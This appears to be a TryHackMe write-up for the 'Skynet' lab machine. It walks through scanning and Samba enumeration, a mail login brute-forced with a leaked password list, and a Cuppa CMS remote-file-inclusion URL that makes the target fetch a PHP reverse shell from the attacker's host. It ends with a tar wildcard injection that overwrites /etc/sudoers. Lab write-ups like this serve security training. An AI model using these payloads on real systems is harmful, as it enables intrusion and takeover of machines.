---
title: Skynet [Unlocked]
description: A vulnerable Terminator themed Linux machine.
slug: tryhackme
date: 2023-05-18 00:00:00+0000
image : assets/skynet.jpeg
categories:
    - TryHackMe
tags:
    - TryHackme
---

[Link to the machine](https://tryhackme.com/room/skynet)

## Answer 1 {#Answer-1}

My target IP : **10.10.84.89**

We start by simply launching an nmap scan.

```bash
 nmap -sC -sV -oN nmap -O -T4 [@Target_IP]
```

![Image 1](assets/1.png)

We can see that 6 services are open, including port 80. We navigate to a web browser to see what it is.

![Image 2](assets/2.png)

We launch gobuster to discover hidden files or directories.

![Image 3](assets/3.png)

The "admin" directory is forbidden, so we focus on the "squirrelmail" directory.

![Image 4](assets/4.png)

We could attempt a brute force attack, but for now, I prefer to revisit the information provided by nmap, which indicates the presence of a Samba share. To exploit it, we can use the tool "enum4linux."

```bash
 enum4linux 10.10.84.89
```

![Image 5](assets/5.png)

Bingo! We learn two things: anonymous account usage is allowed, and there is also a share named "**milesdyson**."

Let's connect anonymously and download the content of the "milesdyson" share.

![Image 6](assets/6.png)

![Image 7](assets/7.png)

We find that "log1.txt" is a password list.

At this stage, we have a list of passwords and a possible username: milesdyson. We try to connect to the mail server using the passwords from this list and the username milesdyson. Success! It was quite fast.

## Answer 2 {#Answer-2}

![Image 8](assets/8.png)

In one of the emails, we find the new password for this user, allowing us to connect to their share.

![Image 9](assets/9.png)

In the "notes" directory, we find the file "important.txt."

![Image 10](assets/10.png)

The document mentions a CMS. Let's see how it looks in the browser.

![Image 11](assets/11.png)

Here is our hidden directory.

## Answer 3 {#Answer-3}

Not knowing what to do at this stage, I relaunch gobuster on this new address.

![Image 12](assets/12.png)

![Image 13](assets/13.png)

We get something called Cuppa CMS.
Let's search if there is a known vulnerability.

![Image 14](assets/14.png)

![Image 15](assets/15.png)

> Remote File Inclusion, let's try to inject a reverse shell.

## Answer 4 {#Answer-4}

I'll use the one from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

My target IP : **10.10.220.244**

Remember to modify the address in the script with your own machine's :

![Image 16](assets/16.png)

In one terminal, we start the Python server where our script is located.

In another terminal, we listen on port 1234 (if you haven't changed it):

```bash
 nc -lvnp 1234
```

So in a shell :

![Image 17](assets/17.png)

And in another :

![Image 18](assets/18.png)

Then, in the web browser:

```http
 http://10.10.84.89/[NAME OF HIDDEN DIRECTORY]/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.220.244:8000/php-reverse-shell.php
```

![Image 19](assets/19.png)

The reverse shell is in place!

![Image 20](assets/20.png)

![Image 21](assets/21.png)

## Answer 5 {#Answer-5}

Now it's time to escalate privileges.

![Image 22](assets/22.png)

I can't use the "sudo -l" command, so I decide to take a look at the crontab, and there we find an interesting file.

![Image 23](assets/23.png)

I'll check [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) to see if we can do something with that "tar" command executed as root.

![Image 24](assets/24.png)

```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1
```

![Image 25](assets/25.png)

After 1 minute :

![Image 26](assets/26.png)

![Image 27](assets/27.png)
